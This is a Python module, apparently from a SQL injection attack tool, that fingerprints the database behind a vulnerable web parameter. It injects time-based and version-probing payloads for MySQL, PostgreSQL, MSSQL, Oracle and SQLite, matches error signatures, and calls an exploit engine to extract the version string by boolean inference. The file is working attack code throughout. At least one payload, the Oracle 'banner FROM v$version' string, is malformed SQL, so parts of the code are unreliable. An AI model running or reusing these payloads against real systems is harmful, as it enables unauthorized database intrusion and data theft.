import re
import logging
from lib.request.client import Request
from lib.injection.exploit import ExploitEngine

logger = logging.getLogger(__name__)

class Fingerprinter:
    def __init__(self, settings, session):
        self.settings = settings
        self.request = Request(session, settings)
        self.session = session

    def fingerprint(self, vuln):
        param = vuln['param']
        loc = vuln['location']
        orig = vuln['original_value']

        # Try error-based fingerprinting
        for dbms, payloads in self._get_fingerprint_payloads().items():
            for payload in payloads:
                full_payload = f"{orig}{payload}"
                resp = self.request.send(param, full_payload, loc)
                if resp and self._match_signature(dbms, resp.text):
                    logger.info(f"Identified DBMS: {dbms}")
                    return dbms

        # Try version extraction via boolean
        version = self._extract_version(vuln)
        if 'mysql' in version.lower():
            return 'MySQL'
        elif 'postgres' in version.lower():
            return 'PostgreSQL'
        elif 'microsoft' in version.lower() or 'sql server' in version.lower():
            return 'MSSQL'
        elif 'oracle' in version.lower():
            return 'Oracle'
        elif 'sqlite' in version.lower():
            return 'SQLite'
        return 'Unknown'

    def _get_fingerprint_payloads(self):
        return {
            'MySQL': ["' AND SLEEP(0)='0", "' AND @@version LIKE '%'-- -"],
            'PostgreSQL': ["' AND pg_sleep(0)='0", "' AND version() LIKE '%'-- -"],
            'MSSQL': ["' AND WAITFOR DELAY '0:0:0'-- -", "' AND @@version LIKE '%'-- -"],
            'Oracle': ["' AND dbms_pipe.receive_message('x',0)='0", "' AND banner FROM v$version LIKE '%'-- -"],
            'SQLite': ["' AND sqlite_version() LIKE '%'-- -"]
        }

    def _match_signature(self, dbms, text):
        signatures = {
            'MySQL': r'mysql|maria|sql syntax',
            'PostgreSQL': r'postgresql|pg_|syntax error at or near',
            'MSSQL': r'microsoft|sql server|odbc',
            'Oracle': r'oracle|ora-',
            'SQLite': r'sqlite'
        }
        pattern = signatures.get(dbms, '')
        return bool(re.search(pattern, text, re.I))

    def _extract_version(self, vuln):
        # Use exploit engine to extract version string
        # We'll create a temporary exploit engine
        engine = ExploitEngine(self.settings, self.session, vuln)
        # Try to extract version using boolean technique
        version = engine.extract_string("version()") if engine else ""
        if not version:
            version = engine.extract_string("@@version") if engine else ""
        return version